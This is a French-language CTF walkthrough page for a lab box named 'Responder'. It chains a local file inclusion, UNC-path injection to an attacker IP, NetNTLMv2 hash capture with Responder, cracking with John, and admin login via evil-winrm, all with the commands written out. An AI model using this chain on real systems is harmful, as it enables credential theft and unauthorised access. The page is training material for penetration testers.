---
sidebar_position: 3
title: "LFI → WinRM"
---

# Scenario : LFI vers WinRM via Responder

**Box** : `Responder`
**Chaine** : LFI → UNC path → Responder capture hash → John craque → Evil-WinRM

## Resume

```
HTTP (port 80)                    Notre machine              WinRM (port 5985)
    │                                 │                          │
    ├── page=../../../../etc/hosts    │                          │
    │   → LFI confirmee              ���                          │
    │                                 │                          │
    ├── page=//NOTRE_IP/share    →   ├── Responder capture      │
    │   (UNC path)                    │   hash NetNTLMv2         │
    │                                 │                          │
    │                                 ├── John craque le hash    │
    │                                 │   → "badminton"          │
    │                                 │                          │
    │                                 └── evil-winrm ──────────→├── Shell admin
    │                                                            └── FLAG
```

## Etapes

### 1. Reconnaissance

- nmap `-p-` revele **port 80 (HTTP)** et **port 5985 (WinRM)**
- Le site redirige vers `unika.htb` → ajouter dans `/etc/hosts`

### 2. Detection LFI

- Parametre `page=` dans l'URL
- Test : `page=../../../../etc/hosts` → contenu affiche → LFI confirmee

### 3. Capture du hash

- Lancer Responder : `sudo responder -I tun0`
- Injecter un chemin UNC : `page=//NOTRE_IP/partage`
- Le serveur Windows tente de s'authentifier → Responder capture le hash NetNTLMv2

### 4. Craquage du hash

- `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
- Resultat : `badminton`

### 5. Acces WinRM

- `evil-winrm -i <IP> -u administrator -p badminton`
- `type C:\Users\mike\Desktop\flag.txt`

## Lecon

Sur une cible **Windows** avec une LFI, toujours penser au **chemin UNC** pour forcer une authentification NTLM. C'est une technique pivot tres puissante.

## Liens

- [Methodologie - Port 80 HTTP](../02-enumeration/port-80-http.md)
- [Methodologie - Port 5985 WinRM](../02-enumeration/port-5985-winrm.md)
- [Cheatsheet - LFI/RFI](/docs/cheatsheet/exploitation/lfi-rfi)
- [Cheatsheet - Hash cracking](/docs/cheatsheet/exploitation/hash-cracking)
- [Cheatsheet - Acces distant](/docs/cheatsheet/post-exploitation/remote-access)
